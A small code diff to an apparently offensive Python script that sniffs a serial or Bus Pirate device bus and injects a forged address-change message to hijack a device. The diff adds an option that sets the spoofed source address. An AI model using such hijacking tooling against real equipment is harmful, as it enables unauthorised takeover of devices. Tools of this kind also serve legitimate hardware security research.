@@ -193,6 +193,7 @@ if __name__ == '__main__':
     parser = OptionParser()
     parser.add_option("-i", "--interface", help="Serial port to use", metavar="DEVICE", dest="serPort")
     parser.add_option("-b", "--bus-pirate", help="Use this switch to tell the serial port is a bus pirate", dest="busPirate", action="store_true", default=False)
+    parser.add_option("-a", "--address", type="int", help="Address of the device sending the address change request", metavar="ADDRESS", dest="address", default=1)
     parser.add_option("-s", "--source", type="int", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
     parser.add_option("-d", "--destination", type="int", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)
     parser.add_option("-t", "--time", help="Time to listen for packets", type="int", metavar="TIME", dest="sniffTime", default=5)
@@ -263,7 +264,7 @@ if __name__ == '__main__':
 
             # Send an address change request to the device
             print "[*] Changing device address to "+str(options.destination)
-            injectMessage( header=251, data=chr(int(options.destination)), source=1, destination=int(options.source))
+            injectMessage( header=251, data=chr(int(options.destination)), source=int(options.address), destination=int(options.source))
 
 
             #Totally flush the input buffer before starting replies
